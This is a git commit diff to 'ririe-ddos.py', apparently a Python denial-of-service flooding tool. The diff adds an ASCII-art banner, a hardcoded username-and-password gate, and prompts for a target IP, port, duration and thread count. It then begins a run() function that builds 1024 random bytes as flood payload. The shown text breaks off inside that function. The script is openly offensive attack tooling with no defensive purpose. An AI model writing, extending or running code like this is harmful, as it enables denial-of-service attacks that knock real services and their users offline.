b9098bd8c524401253011409f601d7f68d3e0950
Kodekeras24 <zhanahmad57@gmail.com>
2024-12-01 21:22:20 +0700

    Update ririe-ddos.py

--- ririe-ddos.py
+++ ririe-ddos.py
@@ -29,11 +29,38 @@ class bcolors:
 attemps = 0
 os.system("clear")
 print(" ")
-print("\033[94m    ±± ±± ±±      ±± ±± ±±                      ±±±             \033[0m")
-print("\033[94m    ±±       ±±   ±±       ±±                 ±± ±±             \033[0m")
-print("\033[94m    ±±       ±±   ±±       ±±                    ±±            \033[0m")
-print("\033[94m    ±±       ±±   ±±       ±±                    ±±           \033[0m")
-print("\033[97m    ±± ±± ±±      ±± ±± ±±        ________       ±±          \033[0m")
-print("\033[97m    ±±   ±±       ±±   ±±         ±± ±± ±±       ±±         \033[0m")
-print("\033[97m    ±±     ±±     ±±     ±±                      ±±        \033[0m")
-print("\033[97m    ±±       ±±   ±±       ±±                 ±± ±± ±±          \033[0m")
+print("\033[94m       ±± ±± ±±      ±± ±± ±±                      ±±±             \033[0m")
+print("\033[94m       ±±       ±±   ±±       ±±                 ±± ±±             \033[0m")
+print("\033[94m       ±±       ±±   ±±       ±±                    ±±             \033[0m")
+print("\033[94m       ±±       ±±   ±±       ±±                    ±±             \033[0m")
+print("\033[97m       ±± ±± ±±      ±± ±± ±±        ________       ±±             \033[0m")
+print("\033[97m       ±±   ±±       ±±   ±±         ±± ±± ±±       ±±             \033[0m")
+print("\033[97m       ±±     ±±     ±±     ±±                      ±±             \033[0m")
+print("\033[97m       ±±       ±±   ±±       ±±                 ±± ±± ±±          \033[0m")
+print("\033[33m _—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—      \033[0m")
+print("\033[1m                                                                    \033[0m")
+print("\033[1m                                                                    \033[0m")
+print("\033[1m                                               \033[0m")
+print("\033[1m                                                \033[0m")
+print("\033[33m_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_\033[0m")
+      
+while attemps < 100:
+    username = input('Enter your username: ')
+    password = input('Enter your password: ')
+
+    if username == 'n0lk0ma' and password == 'n0lk0ma':
+        print('Selamat datang di zona BLACKP∆NTHER!!')
+        break
+    else:
+        print('Incorrect credentials. Check if you have Caps lock on and try again.')
+        attemps += 1
+        continue
+os.system("clear")
+
+ip = str(input(" Target IP :"))
+port = int(input(" Target Port :"))
+choice = str(input(" (y/n) :"))
+times = int(input(" Time :"))
+threads = int(input(" Threads :"))
+def run():
+	data = random._urandom(1024)
